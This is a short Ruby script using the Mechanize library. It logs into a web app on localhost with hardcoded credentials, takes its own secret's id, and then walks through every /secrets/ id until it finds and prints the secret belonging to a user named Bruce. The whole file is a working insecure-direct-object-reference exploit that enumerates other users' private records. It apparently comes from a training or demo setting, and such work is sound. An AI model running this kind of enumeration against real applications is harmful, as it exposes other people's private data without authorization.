require 'mechanize'

Mechanize.new.instance_eval do
  
  # Create a new user account
  get 'http://localhost:3000/users/sign_in'

  page.forms.first.tap do |f|
    f['user[email]']      = 'fox@fox.com'
    f['user[password]']   = '123456789'
    f.submit
  end

  # Grab the id of latest user (us)
  page.link_with(text: "Your Secret").click

  max_id = page.uri.to_s
            .match(/\/secrets\/(...)/)
            .captures.first.to_i

  # Loop through all users
  print 'Searching'

  (1..max_id).each do |id|
    print '.'

    # View the secrets page
    get '/secrets/' + id.to_s

    # Print the secret if we land on Bruce's page
    if page.body =~ /Bruce/
      puts "\n---Found---"
      puts page.search('.secret').text.strip
      break
    end 
  end
end
